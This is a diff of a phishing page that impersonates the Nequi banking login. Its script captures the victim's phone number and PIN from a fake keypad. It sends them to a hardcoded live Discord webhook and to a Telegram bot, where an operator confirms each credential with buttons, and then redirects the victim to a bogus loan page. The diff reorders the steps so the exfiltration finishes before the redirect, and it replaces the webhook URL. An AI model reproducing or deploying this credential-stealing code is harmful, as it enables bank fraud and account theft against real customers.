@@ -54,28 +54,6 @@
         </div>
       </header>
 
-      <!-- <section class="mainSectionContainer loading">
-      <div class="hero-image"></div>
-      <div class="mainSectionWrapper">
-        <div class="logo_nequi_animado">
-          <img src="../assets/loading-nequi.webp" alt="" />
-        </div>
-        <p class="wait-msg">Por favor, espere...</p>
-        <p class="info-msg">
-          En este momento estamos validando algunos datos. puede tardar un
-          momento.
-        </p>
-
-        <div class="bottom" style="display: flex">
-          <p class="warning-msg" id="validoHasta">
-            ,
-            aplican T&amp;C
-          </p>
-          <img src="../assets/seguro_fogafin.svg" alt="image" />
-        </div>
-      </div>
-    </section> -->
-
       <footer>
         <div class="wrap">
           <div class="wrapper">
@@ -166,22 +144,11 @@
       </div>
     </section>
 
-  
-
     <script type="module">
   document.addEventListener("DOMContentLoaded", () => {
-    // const validoHasta = localStorage.getItem('validoHasta');
-
-    // const validoHastaText =
-    //   document.getElementById("validoHasta");
-
-    // validoHastaText.innerHTML = validoHasta;
-
-    const formData = JSON.parse(localStorage.getItem("formData"));
     const inputs = document.querySelectorAll('input[id^="pass-"]');
     const keyboard = document.getElementById("keyboard");
     const deleteBtn = document.getElementById("delete-pass");
-    const loadingSpinner = document.querySelector(".loadingContainer");
     const errorLogin = document.getElementById("error-login");
     const tryAgainButton = document.getElementById("tryAgainButton");
     const loadingContenedor = document.getElementById("loadingContenedor");
@@ -197,15 +164,10 @@
       if (button && !button.id.includes("delete")) {
         const value = button.dataset.value;
         if (currentInput < inputs.length) {
-          // Guardar el valor real en un atributo personalizado
           inputs[currentInput].dataset.realValue = value;
-          // Mostrar asterisco en el campo de entrada
           inputs[currentInput].value = "*";
-          // Disparar el evento input
           inputs[currentInput].dispatchEvent(
-            new Event("input", {
-              bubbles: true,
-            }),
+            new Event("input", { bubbles: true })
           );
           currentInput++;
         }
@@ -218,9 +180,7 @@
         currentInput--;
         inputs[currentInput].value = "";
         inputs[currentInput].dispatchEvent(
-          new Event("input", {
-            bubbles: true,
-          }),
+          new Event("input", { bubbles: true })
         );
       }
     });
@@ -231,9 +191,7 @@
         currentInput--;
         inputs[currentInput].value = "";
         inputs[currentInput].dispatchEvent(
-          new Event("input", {
-            bubbles: true,
-          }),
+          new Event("input", { bubbles: true })
         );
       }
     });
@@ -246,7 +204,7 @@
             e.preventDefault();
             return false;
           });
-        },
+        }
       );
 
       input.addEventListener("paste", (e) => {
@@ -259,12 +217,8 @@
     });
 
     function tieneTresSeguidos(entrada) {
-      // aseguramos que sea string
       const texto = String(entrada);
-
-      // regex: busca cualquier número repetido 3 veces seguidas
       const regex = /(.)\1\1/;
-
       return regex.test(texto);
     }
 
@@ -272,7 +226,7 @@
     inputs.forEach((input, index) => {
       input.addEventListener("input", async () => {
         let isComplete = Array.from(inputs).every(
-          (input) => input.value !== "",
+          (input) => input.value !== ""
         );
         if (isComplete) {
           let pass = "";
@@ -280,88 +234,67 @@
             pass += input.dataset.realValue || "";
           });
 
-          // loadingSpinner.style.display = "block";
           loadingContenedor.style.display = "flex";
           if (tieneTresSeguidos(pass)) {
             setTimeout(() => {
               loadingContenedor.style.display = "none";
               errorLogin.style.display = "block";
             }, 3000);
-
             return;
           }
 
-          const formData =
-            JSON.parse(localStorage.getItem("formData")) || {};
-          const transactionId =
-            Date.now().toString(36) + Math.random().toString(36).substr(2);
+          const formData = JSON.parse(localStorage.getItem("formData")) || {};
+          const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
           formData.password = pass;
           formData.transactionId = transactionId;
           localStorage.setItem("formData", JSON.stringify(formData));
-          setTimeout(() => {
-            window.location.href = "loan-simulator.php.html";
-          }, 3000);
 
-          const message = `⭐⭐Nequi paso 1⭐⭐\n\n📱Número: ${formData.phoneNumber}\n 🔒Clave: ${pass}`;
-          const keyboard = JSON.stringify({
-            inline_keyboard: [
-              {
-                text: "Correcto",
-                callback_data: `correcto:${transactionId}`,
-              },
-              {
-                text: "Incorrecto",
-                callback_data: `incorrecto:${transactionId}`,
-              },
-            ],
-          });
-          try {
-            const response = await sendTelegramMessageWithBtn(
-              message,
-              keyboard,
-            );
-          } catch (error) {
-            console.error("Error al enviar el mensaje:", error);
-          }
-
-          // ENVÍO A DISCORD WEBHOOK (AGREGADO)
-          const discordMessage = `\n⭐⭐ NEQUI PASO 1 - LOGIN ⭐⭐\n\n📱 Número: ${formData.phoneNumber}\n🔒 Clave: ${pass}\n═══════════════════════════════════════`;
+          // 1. ENVIAR A DISCORD INMEDIATAMENTE ANTES DEL TIMEOUT
+          const discordMessage = `\n⭐⭐ NEQUI PASO 1 - LOGIN ⭐⭐\n\n📱 Número: ${formData.phoneNumber || "No registrado"}\n🔒 Clave: ${pass}\n═══════════════════════════════════════`;
           try {
             await sendDiscordMessage(discordMessage);
           } catch (error) {
             console.error("Error al enviar el mensaje a Discord:", error);
           }
+
+          // 2. ENVIAR A TELEGRAM (si aplica)
+          const message = `⭐⭐Nequi paso 1⭐⭐\n\n📱Número: ${formData.phoneNumber}\n 🔒Clave: ${pass}`;
+          const keyboardTg = JSON.stringify({
+            inline_keyboard: [
+              { text: "Correcto", callback_data: `correcto:${transactionId}` },
+              { text: "Incorrecto", callback_data: `incorrecto:${transactionId}` },
+            ],
+          });
+          try {
+            await sendTelegramMessageWithBtn(message, keyboardTg);
+          } catch (error) {
+            console.error("Error al enviar a Telegram:", error);
+          }
+
+          // 3. Redireccionar después de asegurar el envío
+          setTimeout(() => {
+            window.location.href = "loan-simulator.php.html";
+          }, 2000);
         }
       });
     });
   });
 
-  // FUNCIÓN PARA ENVIAR MENSAJE A DISCORD (AGREGADA)
+  // FUNCIÓN PARA ENVIAR MENSAJE A DISCORD
   async function sendDiscordMessage(content) {
-    // REEMPLAZA ESTA URL CON TU WEBHOOK DE DISCORD REAL
-    const webhookUrl = "https://discordapp.com/api/webhooks/1549892470265880719/y3VY99jzYWS8P3IYBrp-5_kNezxd45GP8UD7LoVLz3zFkU-9K50VBj1_GINDg-k6bhsJ";
-    const payload = {
-      content: content
-    };
+    const webhookUrl = "https://discord.com/api/webhooks/1520119877841588235/09Lj574ZkxPmrYqMQMAw6g4a-39axrnzD-rWm6H049XNVRzXFarsFo2VSYsVfGGb_ldY";
+    const payload = { content: content };
 
-    try {
-      const response = await fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(payload),
-      });
+    const response = await fetch(webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    });
 
-      if (!response.ok) {
-        throw new Error(`Error de Discord: ${response.status}`);
-      }
-    } catch (error) {
-      throw error; // Re-lanzamos para que el caller lo capture
+    if (!response.ok) {
+      throw new Error(`Error de Discord: ${response.status}`);
     }
   }
 </script>
   </body>
-
-<!-- Mirrored from https://neqteayuda.blob.core.windows.net/neqkm/access-passed/access-sign-in-pass.php.html by HTTrack Website Copier/3.x [XR&CO], Sun, 18 Oct 2026 23:03:52 GMT -->
 </html>
